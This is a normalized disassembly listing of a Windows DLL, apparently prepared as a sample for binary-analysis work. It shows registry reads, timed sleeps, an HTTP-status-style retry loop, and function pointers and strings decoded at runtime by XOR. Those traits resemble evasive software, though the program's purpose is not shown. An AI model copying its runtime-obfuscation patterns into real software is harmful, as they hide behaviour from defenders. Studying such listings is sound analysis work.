mov [ ebp - 0xb60 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0xb38 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xb40 ]
push edx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0xb3c ]
lea edx [ ebp - 0x54 ]
lea eax [ esi + 0x23 ]
call sub_10036cd0
lea eax [ ebp - 0xb44 ]
push eax
push 0x20119
push esi
lea ecx [ ebp - 0x52c ]
push ecx
push 0x80000002
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xb54 ]
push edx
mov edx [ ebp - 0xb44 ]
lea eax [ ebp - 0x934 ]
push eax
push esi
push esi
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ ebp - 0xb54 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0xb44 ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov ecx [ ebp - 0xb5c ]
mov esi [ StrStrIW@IAT ]
push ecx
lea edx [ ebp - 0x324 ]
push edx
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0xb50 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x27
call sub_10036cd0
lea edx [ ebp - 0x934 ]
push edx
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x734 ]
call sub_100254a0
mov edx [ ebp - 0xb4c ]
add esp 0xc
push edx
mov edx ebx
call sub_10049460
push eax
lea eax [ ebp - 0x324 ]
push eax
call esi
test eax eax
je r-xdata
sub_10018685
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10039b3d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10018722
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
sub_100187b7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
push esi
call sub_10020a90
pop ecx
sub_10018820
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005f572
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100188c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100823f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x198
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0x8 ]
mov edi [ ebx + 0xb0 ]
mov [ ebp - 0x1a0 ] ecx
lea ecx [ ebx + 0xa0 ]
mov [ ebp - 0x198 ] eax
mov [ ebp - 0x180 ] ecx
mov eax edi
jb r-xdata
xor esi esi
push esi
push r--data
push ecx
call sub_10068a30
add esp 0xc
cmp eax esi
jne r-xdata
mov ecx [ ecx ]
sete al
test al al
je r-xdata
xor eax eax
cmp edi esi
setne al
cmp eax esi
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
push esi
push r--data
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x134 ] 0xf
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
call sub_1005d090
mov edi ebx
mov [ ebp - 0x4 ] esi
call sub_10036490
mov [ ebp - 0x16c ] eax
cmp eax esi
je r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x148 ]
call sub_10021250
mov eax 0x43
jmp r-xdata
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x190 ] esi
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x4 ] 0x1
mov edi [ GetTickCount@IAT ]
call edi
mov ecx [ ebp - 0x180 ]
lea edx [ ebp - 0x148 ]
mov esi eax
mov eax [ ebp - 0x16c ]
push edx
push eax
lea edx [ ebp - 0x194 ]
call sub_100291c0
mov [ ebp - 0x184 ] eax
call edi
sub eax esi
mov [ ebp - 0x178 ] eax
fild [ ebp - 0x178 ]
jns r-xdata
fmul [ ebx + 0x118 ]
fnstcw [ ebp - 0x166 ]
movzx eax [ ebp - 0x166 ]
or eax 0xc00
mov [ ebp - 0x178 ] eax
fldcw [ ebp - 0x178 ]
fistp [ ebp - 0x17c ]
mov ecx [ ebp - 0x17c ]
push ecx
fldcw [ ebp - 0x166 ]
call [ Sleep@IAT ]
mov eax [ ebp - 0x184 ]
cmp eax 0x42
je r-xdata
fadd [ r--data ]
mov ecx [ ebp - 0x16c ]
mov [ ecx + 0xd4 ] 0x0
jmp r-xdata
cmp eax 0x43
je r-xdata
lea esi [ ebp - 0x194 ]
call sub_1004c570
mov edx [ ebp - 0x16c ]
mov [ edx + 0xd4 ] 0x0
mov ecx [ ebp - 0x190 ]
mov edi [ ebp - 0x194 ]
test eax eax
jne r-xdata
sub ecx edi
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
mov [ ebp - 0x168 ] 0x0
mov [ ebp - 0x170 ] esi
je r-xdata
mov esi ecx
sub esi edi
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
lea esi [ ebp - 0x194 ]
mov [ ebp - 0x4 ] 0x0
call sub_1004c570
cmp [ ebp - 0x184 ] 0x4
je r-xdata
jmp r-xdata
cmp [ ebp - 0x134 ] 0x10
mov eax [ ebp - 0x148 ]
mov [ ebp - 0x138 ] 0x0
jae r-xdata
lea esi [ ebp - 0x34 ]
call sub_100164a0
lea ecx [ ebx + 0x11c ]
push eax
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x178 ] ecx
call sub_10051390
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10035d10
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
lea esi [ ebx + 0xc4 ]
sub edx eax
xor ecx ecx
sar edx 0x2
mov [ ebp - 0x170 ] ecx
mov [ ebp - 0x168 ] esi
test edx edx
je r-xdata
xor esi esi
jmp r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov [ eax ] 0x0
lea eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x148 ]
call sub_10021250
xor eax eax
lea ecx [ ecx ]
mov eax [ ebp - 0x168 ]
inc eax
add edi 0x3c
mov [ ebp - 0x168 ] eax
cmp eax esi
jb r-xdata
mov edx edi
mov ecx ebx
call sub_10014d20
mov [ ebp - 0x178 ] eax
test eax eax
js r-xdata
lea edi [ ecx * 4 ]
mov ecx [ ebx + 0xc4 ]
mov eax [ edi + ecx ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x198 ]
lea esi [ ebx + 0xc4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push ebx
mov ebx [ eax + 0x40 ]
call sub_1001bd20
lea edx [ ebp - 0x38 ]
mov eax 0x6a
call sub_100328b0
mov eax [ esi ]
mov eax [ edi + eax ]
test eax eax
je r-xdata
lea edx [ ebp - 0x12c ]
mov eax 0x29
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004a800
mov [ ebp - 0x4 ] 0x8
mov ecx [ esi ]
mov ecx [ edi + ecx ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ecx + 0x7c ]
call sub_1001c310
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call sub_10035d10
lea esi [ ebp - 0x34 ]
call sub_100164a0
mov ecx [ ebp - 0x178 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10051390
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10035d10
mov eax [ ebp - 0x168 ]
mov eax [ eax ]
mov ecx [ eax + edi ]
push ecx
lea esi [ ebp - 0x34 ]
call sub_10059250
mov edx [ ebp - 0x180 ]
push edx
mov edx [ ebp - 0x16c ]
mov ecx eax
mov [ ebp - 0x4 ] 0xa
call sub_10043720
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x0
call sub_10021250
cmp esi 0x43
je r-xdata
mov eax [ edi ]
push eax
lea esi [ ebp - 0x34 ]
call sub_100542c0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x2
call sub_10040f60
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10021250
lea edx [ ebp - 0x50 ]
mov eax 0x34
call sub_100328b0
mov ecx edx
push ecx
lea ecx [ ebp - 0x164 ]
call sub_1004a800
mov esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
mov edx [ ebx + 0xc4 ]
push 0xffffffff
add esi esi
add esi esi
mov eax [ esi + edx ]
push 0x0
lea ecx [ ebp - 0x164 ]
push ecx
lea ecx [ eax + 0x60 ]
call sub_1001c310
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0x1
call sub_10035d10
mov edx [ ebx + 0xc4 ]
mov eax [ esi + edx ]
mov ecx [ eax + 0x44 ]
cmp ecx [ eax + 0x48 ]
jne r-xdata
mov eax [ esi ]
add eax edi
push eax
lea edi [ ebp - 0x19c ]
call sub_10012d60
lea ecx [ ebp - 0x148 ]
call sub_10021250
mov eax 0x1
jmp r-xdata
call sub_10012e70
mov eax [ ebp - 0x16c ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0xbc ]
mov eax 0xa
call sub_100328b0
mov esi [ ebp - 0x168 ]
mov eax [ esi ]
mov eax [ edi + eax ]
test eax eax
je r-xdata
mov esi [ ebp - 0x170 ]
lea edx [ ebp - 0x160 ]
mov eax 0x79
call sub_100328b0
push edx
lea ecx [ ebp - 0x34 ]
call sub_1004a800
mov [ ebp - 0x4 ] 0x4
mov eax [ ebx + 0xc4 ]
mov eax [ esi + eax ]
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ eax + 0x60 ]
call sub_1001c310
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_10035d10
mov eax [ ebx + 0xc4 ]
mov edx [ eax + esi ]
push edx
lea esi [ ebp - 0x34 ]
call sub_10059250
mov ecx [ ebp - 0x180 ]
mov edx [ ebp - 0x16c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x5
call sub_10045fe0
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_10021250
cmp esi 0x43
je r-xdata
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10021250
xor esi esi
jmp r-xdata
add edi [ esi ]
push edi
lea edi [ ebp - 0x19c ]
call sub_10012d60
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0x170 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ ebp - 0x170 ] ecx
cmp ecx edx
jae r-xdata
call sub_10012e70
lea edx [ ebp - 0x9c ]
mov eax 0x5e
call sub_100328b0
push edx
lea ecx [ ebp - 0x34 ]
call sub_1004a800
mov ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + ecx * 4 ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ecx + 0x7c ]
call sub_1001c310
lea ecx [ ebp - 0x34 ]
call sub_10035d10
mov eax [ ebp - 0x16c ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x14
call sub_100328b0
jmp r-xdata
lea edi [ ecx * 4 ]
mov eax [ edi + eax ]
mov edx [ eax + 0x44 ]
cmp edx [ eax + 0x48 ]
je r-xdata
sub_10018f09
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_100649a7
pop ecx
pop ecx
pop ebp
retn
sub_10018f30
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
or eax [ rw-data ]
push ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x4 ]
mov ecx [ rw-data ]
mov esi [ ebp - 0x8 ]
cmp edi ecx
ja r-xdata
mov eax [ rw-data ]
jb r-xdata
push 0x0
push 0x2710
push ecx
push eax
call sub_1007d680
push 0x0
push 0x2710
push edi
push esi
mov ebx eax
call sub_1007d680
sub ebx eax
push ebx
call [ Sleep@IAT ]
cmp esi eax
jae r-xdata
sub_10018f99
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10054b6f
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10038ea0
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_10019070
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fba8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4d ] bl
xor edi edi
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] 0x10
mov eax [ ebp + 0x10 ]
jae r-xdata
push 0xdac
call [ Sleep@IAT ]
mov eax 0x43
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x60 ]
mov ecx [ ecx + 0xec ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
lea esi [ ebp - 0x58 ]
push esi
lea esi [ ebp - 0x54 ]
push esi
lea esi [ ebp - 0x5c ]
push esi
mov esi [ ebp + 0x20 ]
push esi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x24
mov eax [ ebp - 0x54 ]
inc edi
cmp eax ebx
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
cmp esi ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x59
inc eax
and edx 0xff
cmp eax 0x1c
jb r-xdata
cmp edi 0x5
jg r-xdata
cmp [ ebp - 0x5c ] 0xc8
jne r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x58 ]
cmp ecx ebx
je r-xdata
cmp [ ebp - 0x4d ] 0x1
jne r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x54 ] ebx
mov dl [ ecx + eax - 0x1 ]
cmp dl 0xa
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
mov [ ecx + eax - 0x1 ] bl
mov ecx [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
dec ecx
mov [ ebp - 0x58 ] ecx
cmp dl 0x20
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_10065045
add esp 0x4
push eax
lea ecx [ ebp - 0x58 ]
call sub_1000f000
cmp eax ebx
mov eax [ ebp - 0x54 ]
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4d ] 0x1
sub_10019210
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
push esi
call sub_1001bc80
lea ecx [ edi + 0x20 ]
push ecx
push esi
call sub_1001bc80
push edi
push esi
call sub_10030ff0
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10019240
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100616c6
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_100315a0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10019290
push ebp
mov ebp esp
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x10 ]
push ebx
mov [ ebp - 0x18 ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
push esi
xor eax eax
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x20 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea edx [ ebp - 0x28 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x24 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_10019368
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001b7e6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10019410
push ebp
mov ebp esp
push 0xffffffff
push sub_10080d1f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ edi ] bl
mov edx 0xf
mov [ edi + 0x1c ] edx
mov [ edi + 0x18 ] ebx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x6c ] ecx
mov [ edi + 0x8 ] bl
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x38 ] edx
mov [ edi + 0x34 ] ebx
mov [ edi + 0x24 ] bl
mov [ edi + 0x40 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0x44 ] ebx
mov [ edi + 0x48 ] ecx
mov [ edi + 0x50 ] ebx
mov [ edi + 0x54 ] ebx
mov [ edi + 0x58 ] ebx
mov ecx 0x7
xor edx edx
mov [ edi + 0x74 ] ecx
mov [ edi + 0x70 ] ebx
mov [ edi + 0x60 ] dx
mov [ edi + 0x90 ] ecx
xor ecx ecx
mov [ edi + 0x8c ] ebx
mov [ edi + 0x7c ] cx
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push esi
call sub_1000b569
add esp 0x4
mov [ esi ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x6c ]
call sub_10053f90
xor esi esi
mov [ edi + 0x4c ] eax
cmp [ edi + 0x48 ] ebx
jbe r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_10065045
add esp 0x4
mov ecx esi
push 0x4
lea esi [ ebp - 0x68 ]
call sub_1006a560
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x5
call sub_100172f0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x14
jmp r-xdata
mov eax [ edi + 0x48 ]
mov ecx [ edi + 0x40 ]
mov edx [ ebp + 0xc ]
sub eax esi
add ecx esi
cmp eax edx
ja r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x28 ] edx
cmp [ ebp + 0x14 ] ebx
je r-xdata
mov edx eax
mov [ ebp - 0x24 ] esi
call sub_10053f90
mov [ ebp - 0x20 ] eax
mov eax [ edi + 0x48 ]
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x4c ]
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x4 ] 0x7
call sub_10008f20
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax esi
mov [ ebp - 0x24 ] eax
call sub_10053f90
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x4c ]
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x4 ] 0x6
call sub_10008f20
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
add esi [ ebp + 0xc ]
cmp esi [ edi + 0x48 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
mov edx [ ebp - 0x48 ]
push edx
jmp r-xdata
xor ebx ebx
call sub_10065045
add esp 0x4
sub_100195cc
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10078ac0
lea esi [ eax + 0x1 ]
push esi
call sub_10056814
mov edi eax
